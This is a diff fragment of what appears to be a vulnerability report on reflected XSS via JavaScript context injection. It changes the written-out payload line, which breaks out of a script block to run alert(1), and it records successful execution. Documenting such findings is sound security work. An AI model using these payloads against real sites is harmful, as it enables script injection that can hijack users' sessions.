@@ -32,7 +32,7 @@ Reflected XSS / JavaScript Context Injection
 
 ## Payload Used
 
-</script><script>alert(1)</script>
+    </script><script>alert(1)<script>//
 
 ## Result
 Successfully executed arbitrary JavaScript by breaking out of the JavaScript context.
